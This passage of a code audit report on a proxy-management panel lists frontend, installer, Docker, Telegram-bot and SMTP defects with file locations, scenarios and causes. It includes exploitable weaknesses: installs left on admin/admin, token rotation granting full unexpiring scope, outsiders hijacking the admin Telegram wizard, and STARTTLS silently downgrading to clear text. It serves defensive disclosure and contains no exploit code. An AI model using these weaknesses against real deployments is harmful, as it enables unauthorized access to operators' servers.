### 4.12 P2 — Invalid JSON in the advanced inbound editor does not block saving the old value

- **Where:** `frontend/src/pages/inbounds/form/advanced-editors.tsx:66–77,
  167–174`.
- **Scenario:** change the settings/stream/sniffing JSON, leave a syntax error
  and press Save.
- **Effect:** the old value is saved, not what the editor shows; the modal closes
  and the entered JSON is lost. Syntax highlighting is not a submit block.
- **Why:** the editor keeps invalid text only in its own buffer; the form store
  still holds the last successfully parsed object. `InboundFormModal.tsx:566–585`
  validates and submits the store without checking the current editor text.

### 4.13 P2 — Subscription export skips selected clients on other pages

- **Where:** `frontend/src/pages/clients/ClientsPage.tsx:1950–1956`;
  `SubLinksModal.tsx:45–51`.
- **Scenario:** select a client on the first page, go to the second page and open
  bulk subscription links (especially visible on mobile, where selection uses
  its own `toggleSelect`).
- **Effect:** Copy All/Download exports an incomplete set despite the selected
  clients.
- **Why:** `emails` holds the saved selected keys while `clients` is only the
  current server page; the modal looks emails up in that array alone and
  silently skips missing ones.
- **Verification:** dropped rows reproduced by executing the original builder.

### 4.14 P2 — Client changes from another session do not refresh Inbounds

- **Where:** `frontend/src/api/websocketBridge.ts:25–29`.
- **Scenario:** browser A has Inbounds open; browser B adds, deletes or reattaches
  a client through Clients.
- **Effect:** the client list and inbound counters stay stale until a manual
  refresh.
- **Why:** the backend sends `invalidate: clients` (`controller/client.go:18–19`)
  and the bridge invalidates only `['clients']`. The inbound list has
  `staleTime: Infinity` (`pages/inbounds/useInbounds.ts:153–156`), and
  `client_stats` only updates existing rows, not `settings.clients`. Local
  mutations mask this because they invalidate both root keys.

### 4.15 P2 — A shared debounce loses one of two different invalidations

- **Where:** `frontend/src/api/websocketBridge.ts:10, 21–30`.
- **Scenario:** `invalidate: inbounds` and `invalidate: clients` arrive in quick
  succession.
- **Effect:** `clients` refreshes, `inbounds` does not, until a manual refresh.
- **Why:** there is one timer; the second event cancels the first and the
  callback keeps only the last type. This is a normal backend sequence:
  `internal/web/job/node_traffic_sync_job.go:237–240`.
- **Verification:** the exact event order was reproduced in-memory.

### 4.16 P2 — Suppressing a “recent local” invalidation drops someone else's change

- **Where:** `frontend/src/api/websocketBridge.ts:24`;
  `frontend/src/api/invalidationTracker.ts:1–8`.
- **Scenario:** a local update has already refetched; another administrator
  changes data within the remaining 1500 ms window.
- **Effect:** someone else's change stays invisible for infinitely fresh caches.
- **Why:** suppression is based on a global timestamp only — no event type,
  revision or author — and a change arriving after the local refetch is dropped
  with no delayed retry.
- **Verification:** the handler's discard was reproduced in-memory.

### 4.17 P2 — The bridge ignores outbound invalidations entirely

- **Where:** `frontend/src/api/websocketBridge.ts:20`.
- **Scenario:** a background outbound-subscription refresh adds, removes or
  changes servers while the Xray page is open.
- **Effect:** subscription outbounds and available tags stay stale.
- **Why:** the backend sends `BroadcastInvalidate(MessageTypeOutbounds)`
  (`internal/web/job/outbound_subscription_job.go:41–47`), but the frontend
  accepts only `inbounds`/`clients`. The Xray config query has
  `staleTime: Infinity` (`hooks/useXraySetting.ts:137–140`); ordinary
  `outbounds` events refresh only the traffic cache, not the configuration.
- **Verification:** ignoring the event confirmed in-memory.

### 4.18 P2 — No missed-state recovery after a WebSocket reconnect

- **Where:** `frontend/src/api/websocketBridge.ts:48–52`;
  `frontend/src/api/websocket.ts:98–102`.
- **Scenario:** the connection drops; another session adds/removes an inbound;
  the WebSocket reconnects.
- **Effect:** traffic flows but the data structure stays stale until a manual
  refresh.
- **Why:** the client emits `connected`, but the bridge does not subscribe to it
  and does not resync. Inbounds/options/Xray config use infinitely fresh caches,
  so missed invalidate events are never replayed. Recovering the transport does
  not recover the UI state.

### 4.19 P3 — MTProto is missing from the inbound picker in bulk client creation

- **Where:** `frontend/src/pages/clients/ClientBulkAddModal.tsx:32–41, 150–154`.
- **Scenario:** create a batch of clients for an existing MTProto inbound.
- **Effect:** a server-supported inbound cannot be selected; with only MTProto
  the target list is empty.
- **Why:** the bulk form whitelist excludes `mtproto` although the single form
  and bulk attach include it. The backend can fill an MTProto secret on create:
  `internal/web/service/client_crud.go:405–408`.

### 4.20 P3 — After a port change the panel redirects hostname connections to the old port

- **Where:** `frontend/src/pages/settings/SettingsPage.tsx:109–113`.
- **Scenario:** open the panel directly at `http://panel.example:2053`; change
  `webPort` to `8443`, save and restart.
- **Effect:** after the restart the browser goes to the dead `:2053`.
- **Why:** the hostname branch changes only protocol/path and ignores the new
  `webPort`; only the IP branch handles a new port.
- **Verification:** reproduced by calling the original URL-building function.

---

## 5. Deploy and integrations

### 5.1 P1 — A password-set failure leaves `admin/admin` while the install reports success

- **Where:** `main.go:407–413, 445`; caller `install.sh:1255–1282`.
- **Scenario:** a first unattended install with `XUI_PASSWORD` longer than 72
  bytes, e.g. 80 ASCII characters.
- **Effect:** the user created at initialization `admin/admin`
  (`internal/database/db.go:58–60, 1297–1308`) is kept, while the operator is
  told their own credentials were installed.
- **Why:** `UpdateFirstUser()` runs bcrypt and returns an error before writing
  the user (`internal/web/service/panel/user.go:144–153`; bcrypt's 72-byte limit
  is confirmed via `go doc`; `internal/util/crypto/crypto.go:12–14`).
  `updateSetting()` only prints the error and returns `nil`; other settings are
  still applied and the installer never checks the credential result before
  printing `Panel Installation Complete`.

### 5.2 P1 — Automated PostgreSQL install is unreachable through its own unattended entry

- **Where:** `install.sh:1059–1063, 1101–1102, 1115–1152`.
- **Scenario:** a fresh Debian/Ubuntu VM, `XUI_NONINTERACTIVE=1`,
  `XUI_DB_TYPE=postgres`, no `XUI_DB_DSN` — the installer has a branch for
  installing a local PostgreSQL in this case.
- **Effect:** PostgreSQL and the service env file are not created, and the
  initial credential change is skipped. On a fresh systemd install the unit then
  starts the panel without the installer's environment
  (`x-ui.service.debian:9–13`) — on SQLite with the original `admin/admin`.
- **Why:** before DB selection the installer runs `x-ui setting -show`; the CLI
  already reads `XUI_DB_TYPE=postgres`, and `InitDB()` fails with
  `XUI_DB_TYPE=postgres but XUI_DB_DSN is empty`
  (`internal/database/db.go:2757–2762`). So `existing_hasDefaultCredential` is
  empty, and the PostgreSQL install branch is only reachable when it is
  `"true"`.
- **Verification:** the branching was confirmed by an isolated call of the real
  `config_after_install()` with stubs for external actions.

### 5.3 P1 — The install error handler deletes the only backup of user files

- **Where:** `install.sh:1644–1657, 1661–1674`.
- **Scenario:** reinstall over a working panel with a custom
  `bin/geoip_custom.dat`; after the old `bin/` is saved, extracting the new
  archive fails, e.g. with `ENOSPC`.
- **Effect:** the last copy of custom geodata and other preserved files is
  deleted. Re-downloading the release restores the panel but not these files or
  the rules that reference them.
- **Why:** the old `bin/` is **moved**, not copied, to `x-ui-bin-backup.$$`; then
  the whole install directory is deleted and the registered `EXIT` trap runs
  `rm -rf` on that backup. On a `tar` error or a missing expected binary the
  script does `exit 1`, while the restore of user files exists only below on the
  success path (`install.sh:1717–1730`).

### 5.4 P2 — Rotating a named API token resets its scope and expiry

- **Where:** `internal/web/service/panel/api_token.go:131–137`; CLI entry
  `main.go:551`.
- **Scenario:** a token `monitor-agent` has scope `monitor` and an expiry. The
  operator rotates it with `x-ui setting -getApiToken -tokenName monitor-agent`.
- **Effect:** the integration receiving the replacement gets full access with no
  expiry.
- **Why:** `RecreateByName()` deletes the old row and creates a new one with only
  `Name`, `Token`, `Enabled`. `Scope` and `ExpiresAt` are not carried over; model
  defaults are `admin` and `0` (`internal/database/model/model.go:171–178`).
  Local rights are needed to run the command — the problem is the silent loss of
  the access policy, not a local authorization bypass.

### 5.5 P2 — A valid PostgreSQL DSN containing `&` breaks env loading in the updater

- **Where:** `install.sh:1224–1227`, `x-ui.sh:3145–3149`, `update.sh:168–175`.
- **Scenario:** a normal DSN such as
  `postgres://xui:secret@127.0.0.1:5432/xui?sslmode=require&connect_timeout=5`.
- **Effect:** the working PostgreSQL install stops being serviced correctly by
  the updater: its CLI calls get an empty DSN, cannot read settings and cannot
  migrate.
- **Why:** the DSN is written to the env file without shell quoting. That is
  valid for systemd, but `update.sh` loads the same file with `source`; Bash
  treats `&` as a background operator, so the `XUI_DB_DSN` assignment happens in
  a subshell and does not survive. Confirmed with an isolated shell
  reproduction.

### 5.6 P2 — Docker publishes platforms with the wrong sidecar binaries

- **Where:** `Dockerfile:17, 31`, `DockerInit.sh:3–27, 39, 50`; publication
  `docker.yml:60`.
- **Scenarios:**
  - `linux/386`: Docker passes `TARGETARCH=386`, but the script recognizes only
    `i386`. The default branch downloads amd64 binaries named
    `xray-linux-amd64` and `mtg-linux-amd64`; the panel looks for `386` suffixes.
  - 32-bit ARM: the script creates `mtg-linux-arm32`, but `GetBinaryName()`
    requires `mtg-linux-arm` (`internal/mtproto/process.go:30–40`).
  - Published `linux/arm/v6`: `TARGETARCH=arm` is the same as v7, `TARGETVARIANT`
    is unused and Xray `arm32-v7a` is selected.
- **Effect:** on 386, Xray/MTProto do not start; on 32-bit ARM, MTProto cannot
  find its binary; a real ARMv6 gets an incompatible Xray.

### 5.7 P2 — A non-admin can edit the admin Telegram wizard through text replies

- **Where:** `internal/web/service/tgbot/tgbot_router.go:113–177`.
- **Scenario:** an administrator creates a client in a Telegram group and
  chooses Telegram-ID input. Another group member replies to the bot's message
  with their own numeric ID.
- **Effect:** the outsider can substitute fields of someone else's draft,
  including `tgID`; when the administrator confirms, that ID is stored in the
  client (`tgbot_client.go:123–139`) and used for ownership checks when issuing
  links. The attacker still cannot press the admin submit — the issue is the
  unauthorized continuation of the wizard.
- **Why:** commands and callbacks check `message.From.ID`/`query.From.ID`, but
  the text-continuation handler checks only that state exists for
  `message.Chat.ID`. For `awaiting_email`, `awaiting_comment` and
  `awaiting_tg_id` there is no admin check. The draft is also keyed by chat ID
  (`tgbot.go:85–101`).

### 5.8 P2 — A non-standard `XUI_MAIN_FOLDER` deletes the binary before a guaranteed unpack failure

- **Where:** `update.sh:993, 1029, 1096, 1111`; the same path in
  `install.sh:1520, 1661`.
- **Scenario:** a working panel installed in `/opt/panel` with
  `XUI_MAIN_FOLDER=/opt/panel`.
- **Effect:** the update leaves the installation without a binary.
- **Why:** `${xui_folder%/x-ui}` strips only the exact `/x-ui` suffix, so the
  updater enters `/opt/panel` instead of its parent. The archive is downloaded
  as `/opt/panel-linux-amd64.tar.gz`, but extraction uses the relative name
  `x-ui-linux-amd64.tar.gz`; the old `/opt/panel/x-ui` has already been deleted
  before that. This also affects the web updater: `resolveUpdateFolders()` takes
  the directory of the actually running executable without restricting it to
  `x-ui` (`internal/web/service/panel/panel.go:506–522`).

### 5.9 P2 — Web update loops forever without stdin when no public IPv4 is found

- **Where:** `update.sh:839–859`; launched from
  `internal/web/service/panel/panel.go:253–280`.
- **Scenario:** a panel update on an IPv6-only host or when all listed IP-echo
  services are unreachable.
- **Effect:** the updater runs forever, burns CPU and writes the same errors to
  the journal; it never reaches the terminal update-status write.
- **Why:** after failed requests it runs `while [[ -z "$server_ip" ]]` with
  `read`. The web updater is started via `systemd-run` without an interactive
  stdin; on EOF `read` does not fill the address, the check zeroes it again, and
  the loop repeats without waiting or exiting. Unlike `install.sh`, this path
  has no noninteractive mode and no fallback address.

### 5.10 P2 — The standard native unit forbids the operations automatic rollback needs

- **Where:** `packaging/native/fbnode.service:14–15` (binary at line 7).
- **Scenario:** the binary is updated via `fbnode upgrade`; the new build crashes
  several times and the attempt counter reaches the rollback threshold.
- **Effect:** rollback fails with a read-only filesystem; the startup code only
  logs it (`cmd/fbnode/main.go:303–307`) and leaves the broken build in place.
- **Why:** the unit has `ProtectSystem=strict`, allowing writes only to
  `/var/lib/fbnode` and `/etc/fbnode`. The binary is installed in
  `/usr/local/bin/fbnode`, and rollback runs inside the service as
  `os.Rename(<current>.previous, <current>)`
  (`internal/native/selfupdate/selfupdate.go:140–148`); `/usr/local/bin` is
  read-only in that namespace. The path/sandbox conflict is confirmed by code;
  no Linux/systemd reproduction was run.

### 5.11 P2 — SMTP `starttls` mode allows a successful send without TLS

- **Where:** `internal/web/service/email/email.go:90–94, 285–295`; connection
  test at `173–179`.
- **Scenario:** the operator selects `starttls` for an IP-whitelisted SMTP relay
  without a login/password, and the server does not advertise STARTTLS or a
  middlebox removes the capability from EHLO.
- **Effect:** notifications are sent in clear text, and the test may report
  success while encryption is selected. This is **not** a claim that a password
  leaks: for a normal remote server `smtp.PlainAuth` separately refuses
  unencrypted authentication. The issue is confirmed for the supported no-auth
  path.
- **Why:** `starttls` and `none` call the same `sendPlain()`. If STARTTLS is
  absent no error is returned and the flow continues to `MAIL`, `RCPT`, `DATA`.
  `TestConnection()` behaves the same way.

### 5.12 P3 — The busy-port check always reports “free” on the `ss` path

- **Where:** `install.sh:83`, `update.sh:134`, `x-ui.sh:26`.
- **Scenario:** port 80 is already used by nginx, `ss` is available, and the
  IP-certificate setup runs.
- **Effect:** the installer says the port is free and skips the alternative-port
  prompt; ACME then fails on bind instead of handling the busy listener.
- **Why:** the awk program contains `$4 ~ p {exit 0} END {exit 1}`. After a match
  and `exit 0`, awk still runs `END`, which replaces the exit code with `1`.
  Reproduced on `0.0.0.0:80` in the real listener format.

---

## Coverage and limits

- **Scope:** `941b13a3` (`native-edge-listen`), one commit ahead of
  `origin/native` (`02808e05`). Working tree was clean throughout.
- **HTTP/auth:** traced production Gin wiring, API scope allowlists, CSRF,
  login/logout, session epoch, 2FA, Bearer tokens and mTLS. No blanket
  unauthenticated API bypass is claimed.
- **Data/services/jobs:** read init/migrations/seeders, dialect transfer, live
  export, inbound/client CRUD, enable/renew/depletion, single/bulk/global
  resets, group baselines, runtime dispatch, remote ID resolution, reconcile
  and the IP-limit/LDAP/sidecar job paths.
- **Sidecars:** `internal/xray`, `internal/mtproto`, `internal/tuic`,
  `internal/amneziawg`, `internal/amneziawgnet`, `internal/pia`,
  `internal/tunnelmonitor` were read; six findings were reproduced with
  in-memory/overlay tests. No confirmed defects were reported for
  `tuic`, `pia` or `tunnelmonitor`.
- **Frontend:** pages, components, hooks, api/websocket bridge and schemas were
  read; `lib/xray` share-link generators were intentionally left to the backend
  audit. Several findings were reproduced by executing the original handlers
  in memory.
- **Deploy:** install/update/CLI scripts, Dockerfile/entrypoint, deploy,
  packaging and workflows were read; shell syntax was checked and isolated
  shell branching was exercised. No installer, Docker build, systemd unit or
  live integration was run.
- **Blocked locally:** `database`, `runtime`, `service` and `job` tests need CGo
  (no `gcc` in this environment; without CGo the link fails on
  `SQLiteConn.Backup`). `internal/amneziawgnet` has Windows UDP bind failures
  and network-test timeouts; `-race` was not run.
- **Not verified by execution:** everything stated as code-path evidence only,
  specifically the auth/session findings, the multi-node ID/reconcile findings,
  the PostgreSQL export finding and all deploy findings. Their reproduction
  scenarios are described but were not driven end-to-end.
